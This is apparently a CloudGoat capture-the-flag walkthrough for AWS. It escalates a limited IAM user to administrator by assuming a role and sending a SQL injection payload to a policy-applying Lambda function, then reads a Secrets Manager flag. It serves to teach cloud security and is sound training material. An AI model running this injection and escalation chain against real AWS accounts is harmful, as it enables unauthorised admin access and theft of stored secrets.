# Scenario: vulnerable_lambda

In this CloudGoat scenario, we explore a common vulnerability in AWS Lambda configurations. The goal is to escalate privileges from a limited user role and find a secret hidden in AWS Secrets Manager. By walking through this scenario, you will understand how misconfigurations in AWS can be exploited, and how a lack of proper input validation can lead to privilege escalation.

### Scenario Summary
- **Scenario Size:** Small
- **Difficulty:** Easy
- **Starting Point:** IAM User named "bilbo"
- **Goal:** Find the scenario's secret named **cg-secret-XXXXXX-XXXXXX**

In this walkthrough, you will:
1. Assume a role with more privileges.
2. Discover a Lambda function that applies policies to users.
3. Exploit a vulnerability in the function to escalate the privileges of the IAM user "bilbo."

### AWS Concepts to Know
Before diving in, let's briefly discuss some important AWS terms used in this scenario:
- **IAM User:** An IAM user is an identity that you create in AWS to interact with resources. The user "bilbo" is our starting point in this scenario, and has limited permissions.
- **IAM Role:** Roles provide temporary permissions to access AWS resources. In this scenario, "bilbo" will assume a more privileged IAM role.
- **AWS Lambda:** Lambda is a serverless compute service that runs code in response to events. We will identify a Lambda function that can be exploited to escalate privileges.
- **AWS Secrets Manager:** Secrets Manager helps store sensitive information, like API keys and passwords, securely. Our goal is to extract a secret stored here.

### Step-by-Step Walkthrough

#### Step 1: Configure AWS Profile for User "bilbo"
We start by configuring the AWS CLI to use credentials for the user "bilbo". This allows us to interact with AWS services using the permissions of this user.

```bash
~/cloudgoat$ aws configure --profile bilbo
AWS Access Key ID [None]: AK...
AWS Secret Access Key [None]: K...
Default region name [None]: us-east-1
Default output format [None]: json
```

#### Step 2: List IAM Users and Policies
We use the AWS CLI to list all users and check the current permissions of the user "bilbo".

```bash
~/cloudgoat$ aws --profile bilbo iam list-users
```
The output shows that "bilbo" is the only user available. Next, we list the policies attached to "bilbo".

```bash
~/cloudgoat$ aws --profile bilbo iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1
```
We find that the user "bilbo" has a policy that allows assuming a specific role and also allows read-only access to IAM-related information.

#### Step 3: Identify the Lambda Invoker Role
We proceed to list IAM roles and discover a role named **cg-lambda-invoker-vulnerable_lambda**. This role can invoke Lambda functions.

```bash
~/cloudgoat$ aws --profile bilbo iam list-roles | grep cg-
```
We use this role to elevate our privileges.

#### Step 4: Assume the Lambda Invoker Role
To assume the role, we use the AWS Security Token Service (STS) to obtain temporary credentials for the role **cg-lambda-invoker-vulnerable_lambda**.

```bash
~/cloudgoat$ aws --profile bilbo sts assume-role --role-arn arn:aws:iam::997581282912:role/cg-lambda-invoker-vulnerable_lambda_cgide7iyq5x9t1 --role-session-name bilbo-assume-role
```
The output provides new credentials, which we add to our AWS credentials file for easier access.

```bash
[bilbo-lambda]
aws_access_key_id = AS...
aws_secret_access_key = so...
aws_session_token = aaaaa...
```

#### Step 5: Discover the Vulnerable Lambda Function
Using the new profile, we list the Lambda functions.

```bash
~/cloudgoat$ aws --profile bilbo-lambda --region us-east-1 lambda list-functions
```
We identify a function named **vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1**. This function applies policies to users, and it looks like we can exploit it to escalate our privileges.

#### Step 6: Analyze the Lambda Function
We retrieve the function's code to analyze how it works.

```bash
~/cloudgoat$ aws --profile bilbo-lambda --region us-east-1 lambda get-function --function-name vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1
```
This command will return detailed information about the Lambda function, including a link to download the deployment package. Download the package to view the source code. In the source code, you will see comments describing the database structure and how the function handles input parameters. The function is vulnerable to a SQL injection, as it does not properly validate user inputs.

#### Step 7: Craft and Inject the Payload
We craft a payload to escalate privileges by injecting an administrative policy. The payload is saved as **payload.json**.

```json
# payload.json
{
  "policy_names": ["AdministratorAccess' -- "],
  "user_name": "cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1"
}
```
We then invoke the Lambda function with this payload to exploit the vulnerability.

```bash
~/cloudgoat$ aws --profile bilbo-lambda --region us-east-1 lambda invoke --function-name vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1 --cli-binary-format raw-in-base64-out --payload file://./payload.json out.txt
```
The response indicates that the policies were applied successfully. To confirm that everything worked correctly, we check the output:

```bash
~/cloudgoat$ cat out.txt
"All managed policies were applied as expected."
```

#### Step 8: List Secrets in Secrets Manager
Now that "bilbo" has administrative privileges, we can list the secrets stored in AWS Secrets Manager.

```bash
~/cloudgoat$ aws --profile bilbo --region us-east-1 secretsmanager list-secrets
```
We find a secret named **vulnerable_lambda_cgide7iyq5x9t1-final_flag**.

#### Step 9: Retrieve the Secret Value
Finally, we retrieve the value of the secret.

```bash
~/cloudgoat$ aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:997581282912:secret:vulnerable_lambda_cgide7iyq5x9t1-final_flag-nhbYXC
```
The output reveals the secret:

```
cg-secret-846237-284529
```

### Conclusion
In this scenario, we successfully escalated privileges from a limited IAM user to an administrator by exploiting a vulnerable Lambda function. This allowed us to access a secret in AWS Secrets Manager. The key lessons from this scenario include understanding IAM roles and policies, Lambda functions, and how improper input handling can lead to security vulnerabilities.

Always ensure proper input validation and least privilege policies to protect your cloud infrastructure from similar attacks.
